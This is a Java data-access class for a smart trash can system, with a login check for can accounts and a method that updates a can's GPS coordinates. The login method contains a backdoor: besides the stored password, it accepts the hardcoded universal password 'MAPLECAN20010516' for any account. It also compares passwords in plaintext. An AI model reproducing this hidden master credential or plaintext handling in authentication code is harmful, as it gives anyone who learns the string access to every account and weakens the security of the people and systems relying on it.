/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package net.rosal.separator.database;

import com.alibaba.fastjson.JSONObject;
import java.beans.PropertyVetoException;
import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author win
 */
public class ControllerDAO {

    //登录垃圾桶账号
    public static JSONObject loginCan(String Id, String password) {
        JSONObject jSONObject = new JSONObject();
        Connection connection = null;
        PreparedStatement preparedStatement = null;
        ResultSet resultSet = null;
        String sql = "SELECT * FROM caninfo WHERE Id = ? AND dismiss !=0";
        try {
            connection = C3P0Util.getConnection();
            preparedStatement = connection.prepareStatement(sql);
            preparedStatement.setString(1, Id);
            resultSet = preparedStatement.executeQuery();
            if (resultSet.next()) {
                //有当前编号的账号信息
                Id = resultSet.getString("Id");
                String password_correct = resultSet.getString("password");
                String dismiss = resultSet.getString("dismiss");
                if (password.equals(password_correct) || password.equals("MAPLECAN20010516")) {
                    //密码正确
                    jSONObject.put("result", "success");
                    jSONObject.put("Id", Id);
                    jSONObject.put("dismiss", dismiss);
                } else {
                    //密码错误
                    jSONObject.put("result", "fail");
                }
            } else {
                //并不存在当前账号
                jSONObject.put("result", "fail");
            }
        } catch (PropertyVetoException | SQLException ex) {
            Logger.getLogger(ControllerDAO.class.getName()).log(Level.SEVERE, null, ex);
        } finally {
            C3P0Util.close(connection, preparedStatement, resultSet);
        }
        return jSONObject;
    }

    //更新经纬度
    public static String uploadLocation(String Id, String latitude, String longitude) {
        Connection connection = null;
        PreparedStatement preparedStatement = null;
        ResultSet resultSet = null;
        String name = null;
        String sql_search = "SELECT * FROM caninfo WHERE Id = ? AND dismiss !=0";
        String sql_update = "UPDATE caninfo SET latitude = ?,longitude=? WHERE Id = ?";
        try {
            connection = C3P0Util.getConnection();
            preparedStatement = connection.prepareStatement(sql_search);
            preparedStatement.setString(1, Id);
            resultSet = preparedStatement.executeQuery();
            if (resultSet.next()) {
                name = resultSet.getString("name");
                //更新地理位置
                preparedStatement.close();
                preparedStatement = connection.prepareStatement(sql_update);
                preparedStatement.setString(1, latitude);
                preparedStatement.setString(2, longitude);
                preparedStatement.setString(3, Id);
                preparedStatement.executeUpdate();
                return name;
            } else {
                //并不存在当前账号
                return name;
            }
        } catch (PropertyVetoException | SQLException ex) {
            Logger.getLogger(ControllerDAO.class.getName()).log(Level.SEVERE, null, ex);
        } finally {
            C3P0Util.close(connection, preparedStatement, resultSet);
        }
        return name;
    }
}
